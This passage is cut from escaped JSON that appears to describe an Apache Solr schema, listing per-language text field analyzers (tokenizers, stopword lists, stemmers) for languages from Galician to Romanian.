dTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"true\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"stopwords.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"similarity\":{}},\"text_gl\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_gl.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GalicianStemFilterFactory\":{\"args\":{\"class\":\"solr.GalicianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.gl.GalicianStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_gl.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GalicianStemFilterFactory\":{\"args\":{\"class\":\"solr.GalicianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.gl.GalicianStemFilterFactory\"}}},\"similarity\":{}},\"text_hi\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"IndicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.IndicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.in.IndicNormalizationFilterFactory\"},\"HindiNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.HindiNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.hi.HindiNormalizationFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hi.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"HindiStemFilterFactory\":{\"args\":{\"class\":\"solr.HindiStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.hi.HindiStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"IndicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.IndicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.in.IndicNormalizationFilterFactory\"},\"HindiNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.HindiNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.hi.HindiNormalizationFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hi.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"HindiStemFilterFactory\":{\"args\":{\"class\":\"solr.HindiStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.hi.HindiStemFilterFactory\"}}},\"similarity\":{}},\"text_hu\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hu.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Hungarian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hu.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Hungarian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_hy\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hy.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Armenian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_hy.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Armenian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_id\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_id.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"IndonesianStemFilterFactory\":{\"args\":{\"class\":\"solr.IndonesianStemFilterFactory\",\"stemDerivational\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.id.IndonesianStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_id.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"IndonesianStemFilterFactory\":{\"args\":{\"class\":\"solr.IndonesianStemFilterFactory\",\"stemDerivational\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.id.IndonesianStemFilterFactory\"}}},\"similarity\":{}},\"text_it\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_it.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_it.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"ItalianLightStemFilterFactory\":{\"args\":{\"class\":\"solr.ItalianLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.it.ItalianLightStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_it.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_it.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"ItalianLightStemFilterFactory\":{\"args\":{\"class\":\"solr.ItalianLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.it.ItalianLightStemFilterFactory\"}}},\"similarity\":{}},\"text_ja\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.ja.JapaneseTokenizerFactory\",\"args\":{\"class\":\"solr.JapaneseTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\",\"mode\":\"search\"}},\"filters\":{\"JapaneseBaseFormFilterFactory\":{\"args\":{\"class\":\"solr.JapaneseBaseFormFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapaneseBaseFormFilterFactory\"},\"JapanesePartOfSpeechStopFilterFactory\":{\"args\":{\"tags\":\"lang/stoptags_ja.txt\",\"class\":\"solr.JapanesePartOfSpeechStopFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapanesePartOfSpeechStopFilterFactory\"},\"CJKWidthFilterFactory\":{\"args\":{\"class\":\"solr.CJKWidthFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKWidthFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ja.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"JapaneseKatakanaStemFilterFactory\":{\"args\":{\"class\":\"solr.JapaneseKatakanaStemFilterFactory\",\"minimumLength\":\"4\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapaneseKatakanaStemFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.ja.JapaneseTokenizerFactory\",\"args\":{\"class\":\"solr.JapaneseTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\",\"mode\":\"search\"}},\"filters\":{\"JapaneseBaseFormFilterFactory\":{\"args\":{\"class\":\"solr.JapaneseBaseFormFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapaneseBaseFormFilterFactory\"},\"JapanesePartOfSpeechStopFilterFactory\":{\"args\":{\"tags\":\"lang/stoptags_ja.txt\",\"class\":\"solr.JapanesePartOfSpeechStopFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapanesePartOfSpeechStopFilterFactory\"},\"CJKWidthFilterFactory\":{\"args\":{\"class\":\"solr.CJKWidthFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKWidthFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ja.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"JapaneseKatakanaStemFilterFactory\":{\"args\":{\"class\":\"solr.JapaneseKatakanaStemFilterFactory\",\"minimumLength\":\"4\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ja.JapaneseKatakanaStemFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"similarity\":{}},\"text_lv\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_lv.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LatvianStemFilterFactory\":{\"args\":{\"class\":\"solr.LatvianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.lv.LatvianStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_lv.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LatvianStemFilterFactory\":{\"args\":{\"class\":\"solr.LatvianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.lv.LatvianStemFilterFactory\"}}},\"similarity\":{}},\"text_nl\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_nl.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"StemmerOverrideFilterFactory\":{\"args\":{\"class\":\"solr.StemmerOverrideFilterFactory\",\"dictionary\":\"lang/stemdict_nl.txt\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.StemmerOverrideFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Dutch\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_nl.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"StemmerOverrideFilterFactory\":{\"args\":{\"class\":\"solr.StemmerOverrideFilterFactory\",\"dictionary\":\"lang/stemdict_nl.txt\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.StemmerOverrideFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Dutch\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_no\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_no.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Norwegian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_no.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Norwegian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_pt\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_pt.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"PortugueseLightStemFilterFactory\":{\"args\":{\"class\":\"solr.PortugueseLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.pt.PortugueseLightStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_pt.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"PortugueseLightStemFilterFactory\":{\"args\":{\"class\":\"solr.PortugueseLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.pt.PortugueseLightStemFilterFactory\"}}},\"similarity\":{}},\"text_ro\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ro.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Romanian\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"